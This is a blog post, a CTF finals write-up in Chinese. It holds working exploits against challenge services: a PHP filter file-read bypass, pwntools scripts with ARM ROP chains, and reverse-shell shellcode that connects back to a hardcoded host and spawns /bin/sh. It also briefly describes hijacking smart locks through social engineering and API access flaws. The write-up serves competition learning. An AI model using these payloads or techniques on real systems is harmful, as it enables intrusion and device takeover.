<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>HWS2021决赛WriteUp | 0xe799bde88f9c</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="这次比赛运气不错拿了第一，但是跟硬件相关的侧信道和故障注入一个都不会做TAT，还是需要向各位大佬学习一个。PS：盲生，你发现华点了没？">
<meta property="og:type" content="article">
<meta property="og:title" content="HWS2021决赛WriteUp">
<meta property="og:url" content="https://www.summershrimp.com/2021/03/HWS2021%E5%86%B3%E8%B5%9BWriteUp/index.html">
<meta property="og:site_name" content="0xe799bde88f9c">
<meta property="og:description" content="这次比赛运气不错拿了第一，但是跟硬件相关的侧信道和故障注入一个都不会做TAT，还是需要向各位大佬学习一个。PS：盲生，你发现华点了没？">
<meta property="og:locale">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_4c14b10250a5a017cb552b719b7cab12.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_c75b80835690d6deaf0918a21b180535.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_7fda774c7c6f805800883966349503d5.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_42d69f88a4cb49a073cc45142f1b24b1.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_23c71b8cd7a1aafa727b44b71164ed44.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_73c139a3610b4ba4765f19e847000947.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_004a15dec488488acc236024e472f078.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_9d6994fcaa64b1c0edadd1d076765745.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_d59fecd902033bc6cac3c174d682bddc.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_fea10ac8d4aca0dd830bfcf70b4c12b3.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_1c5accd8b6e8d071b27c5d03997a3d26.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_86eca8d38febee74ba7572442f62485c.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_cb536e08fc450a2904832a7f80a27287.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_dd2485f7ea2eb785faffcc29312a9107.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_9ff35224020cd2672a423eb059c57c8d.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_ebf83237acdfd707f802eadbf8796e7b.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_f7d42928df16613314035ef354055b4b.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_1ec5aa3dccf0b58ea7186d52c266526f.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_4780e6fc4c9d0e278cfeb71f893f4948.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_576eee6f38773362b9d99026b1c3b78e.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_4ec5ae51d0d3042e8f53e1d71d7c9701.png">
<meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_19275b585d7e672cf438bddde1fb93ff.png">
<meta property="article:published_time" content="2021-03-02T10:15:59.000Z">
<meta property="article:modified_time" content="2023-06-07T14:24:54.004Z">
<meta property="article:author" content="Yibai Zhang">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="WriteUP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.summershrimp.com/uploads/upload_4c14b10250a5a017cb552b719b7cab12.png">
  
    <link rel="alternate" href="/atom.xml" title="0xe799bde88f9c" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">0xe799bde88f9c</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.summershrimp.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-HWS2021决赛WriteUp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/03/HWS2021%E5%86%B3%E8%B5%9BWriteUp/" class="article-date">
  <time datetime="2021-03-02T10:15:59.000Z" itemprop="datePublished">2021-03-02</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      HWS2021决赛WriteUp
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这次比赛运气不错拿了第一，但是跟硬件相关的侧信道和故障注入一个都不会做TAT，还是需要向各位大佬学习一个。<br>PS：盲生，你发现华点了没？</p>
<a id="more"></a>

<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p><a target="_blank" rel="noopener" href="http://hws2021-web.node3.buuoj.cn/">http://hws2021-web.node3.buuoj.cn/</a><br>通过访问<code>?file=index.php</code>可以获得源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	header(<span class="string">&#x27;Location: /?file=log.txt&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$re</span> = <span class="string">&#x27;/^\w*\.\w*$/m&#x27;</span>;</span><br><span class="line"></span><br><span class="line">preg_match_all(<span class="variable">$re</span>, <span class="variable">$file</span>, <span class="variable">$matches</span>, PREG_SET_ORDER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(count(<span class="variable">$matches</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;illegal operation!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p>preg多行匹配，<code>^</code>可以匹配到任意行的起始，因此可以用换行符绕过检查。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;hws2021-web.node3.buuoj.cn&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;%0aconvert.base64%0a-encode&#x2F;resource&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure>

<h2 id="easylock"><a href="#easylock" class="headerlink" title="easylock"></a>easylock</h2><p>出题人提供的智能锁APP所有在线功能都无法使用。<br>我们通过社工（拨打锁的官方网站上的客服电话）的方法获取到了锁的相关信息，并且下载到了最新版的APP。<br>经过一些逆向和抓包分析，发现其后台API接口存在大量的信息泄露/平行权限，可以任意解绑硬件，绑定到新账号。于是通过第一次挑战上台获取到了锁ID。第一次挑战失败后通过锁ID获取到了锁主人账号，并将其所有的锁都绑定到了自己账号上，然后上台开锁。<br>该漏洞已经提交补天和厂家，细节暂不在此透露。</p>
<h2 id="easyserver"><a href="#easyserver" class="headerlink" title="easyserver"></a>easyserver</h2><p>可以跨目录读文件，但没啥用，限制长度了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">data &#x3D; &quot;GET &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;flag HTTP&#x2F;1.1\r\n&quot;</span><br><span class="line">data +&#x3D; &quot;\r\n&quot;</span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;192.168.245.158&quot;, 59816)</span><br><span class="line"></span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>0x1103C 栈溢出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if ( !strcmp_0(req, &quot;POST&quot;) )</span><br><span class="line">&#123;</span><br><span class="line">  while ( recv_string(sock_fd, v9, 0x500) &gt; 0 &amp;&amp; strcmp(&quot;\n&quot;, &amp;v9[60]) )</span><br><span class="line">  &#123;</span><br><span class="line">    v9[75] &#x3D; 0;</span><br><span class="line">    if ( !strcmp_0(&amp;v9[60], &quot;Content-Length:&quot;) )</span><br><span class="line">      content_length &#x3D; atoi(&amp;v9[76]);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( content_length &#x3D;&#x3D; -1 )</span><br><span class="line">    return send_400(sock_fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后 rop 调用 send_file 把 /tmp/207775d1ee9b9efa245fd9fb6fc03b68/flag 的内容通过socket发出来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">data &#x3D; &quot;POST &#x2F;404.html HTTP&#x2F;1.1 &#x2F;tmp&#x2F;207775d1ee9b9efa245fd9fb6fc03b68&#x2F;flag\r\n&quot;</span><br><span class="line"># data +&#x3D; &quot;\r\n&quot;</span><br><span class="line"># data +&#x3D; &quot;B&quot; * 0x500</span><br><span class="line">data +&#x3D; &quot;A&quot; * 0x44c</span><br><span class="line">data +&#x3D; &quot;B&quot; * (0x500 - 0x44c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 006099C                 POP     &#123;R0,PC&#125;</span><br><span class="line"># 00060A84                 POP     &#123;R1,PC&#125;</span><br><span class="line"></span><br><span class="line">pop_r0 &#x3D; 0x006099C</span><br><span class="line">pop_r1 &#x3D; 0x60A84</span><br><span class="line">close_addr &#x3D; 0x2C068</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;192.168.245.158&quot;, 59816)</span><br><span class="line"></span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;U&quot; * 1034</span><br><span class="line">payload +&#x3D; &quot;BBBB&quot;</span><br><span class="line">payload +&#x3D; p32(pop_r0)</span><br><span class="line">payload +&#x3D; p32(6)</span><br><span class="line">payload +&#x3D; p32(pop_r1)</span><br><span class="line">payload +&#x3D; p32(0x8acfc)</span><br><span class="line">payload +&#x3D; p32(0x0010A08)</span><br><span class="line">payload +&#x3D; p32(pop_r0)</span><br><span class="line">payload +&#x3D; p32(6)</span><br><span class="line">payload +&#x3D; p32(close_addr)</span><br><span class="line">payload +&#x3D; &quot;K&quot; * (0x500 - 60 - len(payload) - 3)</span><br><span class="line">payload +&#x3D; &quot;\n\x00\x00&quot;</span><br><span class="line"></span><br><span class="line">p.send(&quot;C&quot; * 59 + &quot;\n\x00&quot; + payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(&quot;\n\x00&quot; + cyclic(0x400 - 2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>但是主办方说flag的路径必须通过getshell获得。。。。。</p>
<p>栈溢出然后使用 shellcode 反弹shellcode</p>
<p>shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">data &#x3D; &quot;POST &#x2F;404.html HTTP&#x2F;1.1 &quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> sub  r4, sp, #0xd0</span><br><span class="line"> push  &#123;r4&#125;</span><br><span class="line"> pop   &#123;pc&#125;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">data +&#x3D; &quot;\xd0\x40\x4d\xe2\x04\x40\x2d\xe5\x04\xf0\x9d\xe4\x02\x00\xa0\xe3&quot;</span><br><span class="line">data +&#x3D; &quot;\r\n&quot;</span><br><span class="line"></span><br><span class="line"># data +&#x3D; &quot;B&quot; * 0x500</span><br><span class="line">data +&#x3D; &quot;A&quot; * 0x44c</span><br><span class="line">data +&#x3D; &quot;B&quot; * (0x500 - 0x44c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 006099C                 POP     &#123;R0,PC&#125;</span><br><span class="line"># 00060A84                 POP     &#123;R1,PC&#125;</span><br><span class="line"># 0002BC90                 POP     &#123;R7,PC&#125;</span><br><span class="line"># text:2691C              svc   POP     &#123;R4-R8,PC&#125;</span><br><span class="line"># 0003BD60                 POP     &#123;R3-R11,PC&#125;</span><br><span class="line"></span><br><span class="line">pop_r0 &#x3D; 0x006099C</span><br><span class="line">pop_r1 &#x3D; 0x60A84</span><br><span class="line">close_addr &#x3D; 0x2C068</span><br><span class="line">pop_r7 &#x3D; 0x0002BC90</span><br><span class="line">svc_pop_r4_r8 &#x3D; 0x0002691C</span><br><span class="line"></span><br><span class="line">pop_r3_r11 &#x3D; 0x0003BD60</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;20.21.2.27&quot;, 59816)</span><br><span class="line"></span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">fd_n &#x3D; 6</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; &quot;\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x02\x20\x42\xe0\xc8\x70\xa0\xe3\x51\x70\x87\xe2\x00\x00\x00\xef\x00\x40\xa0\xe1\x64\x10\x8f\xe2\x01\x20\xc1\xe5\x10\x20\xa0\xe3\x02\x70\x87\xe2\x00\x00\x00\xef\x3f\x70\xa0\xe3\x04\x00\xa0\xe1\x01\x10\x41\xe0\x00\x00\x00\xef\x04\x00\xa0\xe1\x01\x10\xa0\xe3\x00\x00\x00\xef\x04\x00\xa0\xe1\x02\x10\xa0\xe3\x00\x00\x00\xef\x30\x00\x8f\xe2\x02\x20\x42\xe0\x00\x10\xa0\xe1\x05\x10\x81\xe2\x00\x60\xa0\xe1\x80\x60\x86\xe2\x00\x10\x86\xe5\x04\x20\x86\xe5\x06\x10\xa0\xe1\x07\x20\xc0\xe5\x0b\x70\xa0\xe3\x00\x00\x00\xef\x02\xff\x11\x5c\x14\x15\x02\x1a\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;U&quot; * 1034</span><br><span class="line">payload &#x3D; cyclic(834)</span><br><span class="line">payload +&#x3D; shellcode</span><br><span class="line">payload +&#x3D; &quot;K&quot; * (1034 - len(payload))</span><br><span class="line">payload +&#x3D; &quot;BBBB&quot;</span><br><span class="line"># payload +&#x3D; p32(pop_r7)</span><br><span class="line"># payload +&#x3D; p32(0x7d) # mprotect</span><br><span class="line"></span><br><span class="line">payload +&#x3D; p32(0x8acfc)</span><br><span class="line">payload +&#x3D; p32(0x08ACE4) # socket</span><br><span class="line"></span><br><span class="line">payload +&#x3D; p32(pop_r1)</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line"></span><br><span class="line">payload +&#x3D; p32(svc_pop_r4_r8)</span><br><span class="line">payload +&#x3D; p32(0x11223344) * 4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># payload +&#x3D; shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload +&#x3D; &quot;K&quot; * (0x500 - 60 - len(payload) - 3)</span><br><span class="line">payload +&#x3D; &quot;\n\x00\x00&quot;</span><br><span class="line"></span><br><span class="line">p.send(&quot;C&quot; * 59 + &quot;\n\x00&quot; + payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(&quot;\n\x00&quot; + cyclic(0x400 - 2))</span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.summershrimp.com/uploads/upload_4c14b10250a5a017cb552b719b7cab12.png"></p>
<h3 id="本题华点"><a href="#本题华点" class="headerlink" title="本题华点"></a>本题华点</h3><p>rop和shellcode调了好久，坑点:</p>
<ol>
<li>这块板子使用的是arm926核心的处理器，其指令集是armv5，虽然支持mmu，但是并不支持NX bit。因此不管编译选项有没有开NX，实际运行的时候都是没有NX的。</li>
<li>嵌入式rootfs常用的busybox，在启动/bin/sh的时候 argv[0]必须是”sh”， 直接传<code>argv=NULL</code>是无法启动的。因此rop了半天都不成功</li>
</ol>
<p>因此，写出来一套shellcode后，后面的pwn题都可以秒杀了。</p>
<h2 id="easyserver2"><a href="#easyserver2" class="headerlink" title="easyserver2"></a>easyserver2</h2><p>漏洞： 解析ip的时候栈溢出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall read_from_remote(char *ip, int size)</span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  for ( idx &#x3D; 0; ip[idx] !&#x3D; &#39;:&#39;; ++idx )</span><br><span class="line">    stack[idx] &#x3D; ip[idx];                       &#x2F;&#x2F; 拷贝ip</span><br></pre></td></tr></table></figure>


<p>首先 rop 利用 r1 得到栈地址，然后jmp shellcode.</p>
<p>exploit：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;20.21.2.27&quot;, 59809)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh_jmper &#x3D; &quot;\x80\x10\x81\xe2\xc4\x10\x81\xe2\x31\xff\x2f\xe1\x02\x00\xa0\xe3\x01\x10\xa0&quot;</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; &quot;\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x02\x20\x42\xe0\xc8\x70\xa0\xe3\x51\x70\x87\xe2\x00\x00\x00\xef\x00\x40\xa0\xe1\x64\x10\x8f\xe2\x01\x20\xc1\xe5\x10\x20\xa0\xe3\x02\x70\x87\xe2\x00\x00\x00\xef\x3f\x70\xa0\xe3\x04\x00\xa0\xe1\x01\x10\x41\xe0\x00\x00\x00\xef\x04\x00\xa0\xe1\x01\x10\xa0\xe3\x00\x00\x00\xef\x04\x00\xa0\xe1\x02\x10\xa0\xe3\x00\x00\x00\xef\x30\x00\x8f\xe2\x02\x20\x42\xe0\x00\x10\xa0\xe1\x05\x10\x81\xe2\x00\x60\xa0\xe1\x80\x60\x86\xe2\x00\x10\x86\xe5\x04\x20\x86\xe5\x06\x10\xa0\xe1\x07\x20\xc0\xe5\x0b\x70\xa0\xe3\x00\x00\x00\xef\x02\xff\x11\x5c\x14\x15\x02\x1a\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># .text:00052494                 STR     R3, [R1]</span><br><span class="line"># .text:00052498</span><br><span class="line"># .text:00052498                 ADD     SP, SP, #0xC</span><br><span class="line"># .text:0005249C                 POP     &#123;R4-R9,PC&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str_r3_r1 &#x3D; 0x00052494</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># .text:0002AC80                 POP     &#123;R0,R4,PC&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r0_r4_pc &#x3D; 0x002AC80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># .text:00061C04                 POP     &#123;R1,PC&#125;</span><br><span class="line"></span><br><span class="line">r1_pc &#x3D; 0x00061C04</span><br><span class="line"></span><br><span class="line"># .fini:000646AC                 POP     &#123;R3,PC&#125;</span><br><span class="line"></span><br><span class="line">r3_pc &#x3D; 0x000646AC</span><br><span class="line"></span><br><span class="line"># .text:0001D554                 BLX     R1</span><br><span class="line"></span><br><span class="line">blx_r1 &#x3D; 0x0001D554</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data &#x3D; &quot;&quot;</span><br><span class="line">data +&#x3D; sh_jmper[4:80]</span><br><span class="line">data +&#x3D; &quot;b&quot; * (140 - len(data))</span><br><span class="line">data +&#x3D; p32(0x8A1AC)</span><br><span class="line">data +&#x3D; &quot;b&quot; * (0xa4 - len(data))</span><br><span class="line">data +&#x3D; p32(0xa4)</span><br><span class="line">data +&#x3D; &quot;c&quot; * 4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data +&#x3D; p32(r3_pc)</span><br><span class="line">data +&#x3D; sh_jmper[:4]</span><br><span class="line"></span><br><span class="line">data +&#x3D; p32(0x00052494)</span><br><span class="line"></span><br><span class="line">data +&#x3D; &quot;d&quot; * 0xc</span><br><span class="line">data +&#x3D; p32(0) * 6 # dummy</span><br><span class="line">data +&#x3D; p32(blx_r1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data +&#x3D; shellcode</span><br><span class="line">data +&#x3D; &quot;:\r\n&quot;</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;GET &#x2F;index.html?&amp;&amp;?size&#x3D;1231?ip&#x3D;&#39; + data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(&quot;B&quot; * 100)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.summershrimp.com/uploads/upload_c75b80835690d6deaf0918a21b180535.png"></p>
<h2 id="babyhttpd"><a href="#babyhttpd" class="headerlink" title="babyhttpd"></a>babyhttpd</h2><p>POST中sscanf读取了<code>%[^&amp;]&amp;%*[^=]=%[^;]</code>，读取了两个参数，以a=1&amp;b=2为例，v11读取到了a=1，haystack读取到了2，msg长度最大为1024，可以达到栈溢出的效果，将返回地址修改为bss地址，可以达到shellcode执行的效果。<br><img src="https://hackmd.summershrimp.com/uploads/upload_7fda774c7c6f805800883966349503d5.png"></p>
